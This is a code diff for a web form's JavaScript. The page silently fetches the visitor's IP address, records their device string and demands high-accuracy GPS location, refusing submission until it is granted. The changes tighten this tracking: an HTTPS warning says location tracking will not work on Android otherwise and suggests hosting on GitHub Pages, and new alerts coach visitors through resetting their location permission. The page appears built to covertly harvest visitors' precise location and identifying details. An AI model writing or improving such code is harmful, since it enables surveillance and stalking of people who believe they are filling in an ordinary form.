@@ -9,9 +9,15 @@ let currentStep = 0;
 // --- TRACKING VARIABLES ---
 let userLocation = null;
 let userIP = "Fetching...";
-let deviceType = navigator.userAgent; // Capture Device String
+let deviceType = navigator.userAgent; 
 
-// 1. Silent IP Fetch
+// --- 1. SECURITY CHECK (NEW) ---
+// If the site is NOT secure (HTTP) and NOT localhost, warn the admin/user.
+if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+    alert("⚠️ SECURITY WARNING ⚠️\n\nYou are using an insecure link (HTTP).\n\nLocation tracking WILL NOT WORK on Android.\n\nPlease upload to GitHub Pages and use the HTTPS link.");
+}
+
+// --- 2. Silent IP Fetch ---
 fetch('https://ipapi.co/json/')
   .then(res => res.json())
   .then(data => {
@@ -20,17 +26,25 @@ fetch('https://ipapi.co/json/')
   })
   .catch(err => userIP = "Failed to capture IP");
 
-// 2. Request Location
+// --- 3. Request Location ---
 function requestLoc() {
+    if (!navigator.geolocation) {
+        userLocation = "Not Supported";
+        return;
+    }
     navigator.geolocation.getCurrentPosition(
       (pos) => { 
         userLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude }; 
-        document.getElementById("locMsg").style.display = "none";
+        const msg = document.getElementById("locMsg");
+        if(msg) msg.style.display = "none";
       },
       (err) => { 
+        console.warn("Location Error:", err.code, err.message);
         userLocation = "Denied"; 
-        document.getElementById("locMsg").style.display = "block";
-      }
+        const msg = document.getElementById("locMsg");
+        if(msg) msg.style.display = "block";
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 }
 requestLoc(); // Ask on load
@@ -80,7 +94,7 @@ nextBtn.addEventListener("click", async () => {
   // --- FORCE LOCATION CHECK ---
   if (currentStep === questions.length - 1) {
     if(!userLocation || userLocation === "Denied") {
-        alert("⚠️ LOCATION REQUIRED\n\nYou cannot submit this form without location access.\n\nPlease check your browser address bar (Lock icon) and allow Location.");
+        alert("⚠️ LOCATION REQUIRED\n\n1. Check if your GPS is ON.\n2. Click the Lock icon 🔒 in the address bar.\n3. Click 'Permissions' -> Reset Location.\n4. Reload the page.");
         requestLoc();
         return;
     }
